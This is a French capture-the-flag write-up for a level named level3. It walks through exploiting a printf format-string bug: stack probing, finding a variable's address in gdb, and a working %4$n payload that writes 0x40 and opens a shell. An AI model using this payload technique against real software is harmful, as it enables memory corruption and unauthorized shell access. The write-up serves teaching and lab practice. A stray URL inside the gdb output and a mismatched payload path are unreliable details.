# level3 : format string


    void v(void)
    {
        char local_20c [520];
        
        fgets(local_20c,512,stdin);
        printf(local_20c);
        if (m == 0x40) {
            fwrite("Wait what?!\n",1,0xc,stdout);
            system("/bin/sh");
        }
        return;
    }


    void main(void)
    {
        v();
        return;
    }



Le  problème : `printf(local_20c)` passe directement notre propre input comme chaîne de format. Aucune chaîne de contrôle fixe (`"%s", local_20c`), juste `local_20c` tout seul comme premier argument : `printf` va donc interpréter n'importe quel `%x`, `%s`, `%n` qu'on lui envoie.

    | (Ancienne variable X)  | <-- printf va lire ça pour le 4ème %x
    |------------------------|
    | (Adresse de retour)    | <-- printf va lire ça pour le 3ème %x
    |------------------------|
    | (Ancienne variable Y)  | <-- printf va lire ça pour le 2ème %x
    |------------------------|
    | (Ancienne variable Z)  | <-- printf va lire ça pour le 1er %x
    |------------------------|
    | Pointeur vers "%x %x.."| <-- 1er argument : la chaîne de format 
    |------------------------|

**Trouver où notre buffer atterrit dans la stack**

    echo "BBBB %x %x %x %x %x %x %x" | ./level3
    BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078


`BBBB` (`0x42424242`) apparaît en 4e position. Donc si on met une adresse à la place de `BBBB`, on peut la cibler directement via `%4$n` (accès direct au 4e argument, syntaxe GNU).

**Trouver l'adresse de `m`**

    gdb ./level3
    (gdb) p &m
    $1 = 0x804988c
    https://picoctfsolutions.com/tools/pwntools-payload
    8c 98 04 08

**Construire le payload**

`%n` écrit le nombre de caractères déjà affichés par ce `printf`, à l'adresse donnée. Il faut donc que stack 64 caractères soient sortis avant que `%4$n` s'exécute :

- 4 octets d'adresse (comptés comme caractères "littéraux" par printf, même s'ils sont illisibles) ;
- + 60 caractères de bourrage (`'B'`) ;
- = 64 = `0x40`. Exactement la valeur attendue par le check.

    (printf '\x8c\x98\x04\x08'; printf 'B%.0s' {1..60}; printf '%s' '%4$n') > /tmp/payload

(le `printf '%s' '%4$n'` sert à sortir le texte littéral `%4$n` sans que le `printf` de bash n'essaie de le réinterpréter lui-même comme son propre format.)

injection (le `cat -` garde stdin ouvert pour utiliser le shell une fois ouvert) :

    (cat payload; cat -) | ./level3
